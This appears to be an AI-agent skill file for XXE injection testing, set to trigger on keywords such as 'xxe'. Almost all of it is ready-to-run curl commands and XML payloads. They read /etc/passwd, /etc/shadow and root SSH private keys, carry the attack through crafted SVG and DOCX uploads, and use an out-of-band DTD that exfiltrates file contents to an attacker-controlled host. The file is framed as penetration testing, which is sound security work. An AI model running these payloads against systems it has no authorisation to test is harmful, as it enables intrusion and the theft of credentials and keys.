---
name: vuln-xxe
description: "XML External Entity (XXE) injection testing — local file read, SSRF via XXE, blind OOB XXE via DNS/HTTP callbacks, parameter entity XXE, DTD-based exfiltration, XXE via SVG/DOCX/XLSX. Triggers: 'xxe', 'xml external entity', 'xxe injection', 'xml injection', 'blind xxe', 'dtd injection', 'oob xxe', 'xml ssrf', 'svg xxe', 'file read via xml'."
---

# XML External Entity (XXE) Injection

Abuse XML parsers to read local files, trigger SSRF, or perform OOB exfiltration.

---

## Phase 1: Detection

```bash
TARGET="https://TARGET"
COLLAB="BURP_COLLABORATOR_HOST"

curl -s -X POST "$TARGET/api/xml" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>'

cat > /tmp/xxe_test.svg << 'EOF'
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd" [
  <!ELEMENT svg ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
EOF
curl -s -F "file=@/tmp/xxe_test.svg" "$TARGET/upload"

curl -s -X POST "$TARGET/api/xml" \
  -H "Content-Type: application/xml" \
  -d "<?xml version=\"1.0\"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM \"http://$COLLAB/xxe_probe\">]>
<root><data>&xxe;</data></root>"
```

---

## Phase 2: File Read

```bash
TARGET="https://TARGET"

XXE_PAYLOAD='<?xml version="1.0"?>
<!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/passwd">]>
<data>&file;</data>'
curl -s -X POST "$TARGET/api/xml" -H "Content-Type: application/xml" -d "$XXE_PAYLOAD"

curl -s -X POST "$TARGET/api/xml" -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE d [<!ENTITY f SYSTEM "file:///etc/shadow">]><d>&f;</d>'

curl -s -X POST "$TARGET/api/xml" -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE d [<!ENTITY f SYSTEM "file:///root/.ssh/id_rsa">]><d>&f;</d>'

curl -s -X POST "$TARGET/api/xml" -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE d [<!ENTITY f SYSTEM "file:///C:/Windows/win.ini">]><d>&f;</d>'

curl -s -X POST "$TARGET/api/xml" -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE d [<!ENTITY f SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><d>&f;</d>'
```

---

## Phase 3: Blind OOB Exfiltration

```bash
TARGET="https://TARGET"
COLLAB="BURP_COLLABORATOR_HOST"
ATTACKER="https://attacker.com"

cat > /tmp/malicious.dtd << 'EOF'
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER/?data=%file;'>">
%eval;
%exfil;
EOF

curl -s -X POST "$TARGET/api/xml" -H "Content-Type: application/xml" \
  -d "<?xml version=\"1.0\"?>
<!DOCTYPE data SYSTEM \"http://$COLLAB/malicious.dtd\">
<data>test</data>"

curl -s -X POST "$TARGET/api/xml" -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % remote SYSTEM "http://'"$COLLAB"'/xxe.dtd">
  %remote;
]>
<data>&send;</data>'
```

---

## Phase 4: XXE via File Formats

```bash
TARGET="https://TARGET"

cp sample.docx /tmp/xxe_test.docx
cd /tmp && unzip -o xxe_test.docx word/document.xml
sed -i 's|<?xml version="1.0" encoding="UTF-8" standalone="yes"?>|<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE doc [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>|' word/document.xml
sed -i 's|<w:body>|<w:body>&xxe;|' word/document.xml
zip -u xxe_test.docx word/document.xml
curl -s -F "file=@/tmp/xxe_test.docx" "$TARGET/upload/docx"
```

---

## Output

Save to `output/`:
- `xxe_file_read.txt` — /etc/passwd content if readable
- `xxe_oob_callbacks.txt` — OOB DNS/HTTP callback evidence

## Next Phase

→ `vuln-ssrf` for internal service access via XXE
→ `pentest-report` to document findings
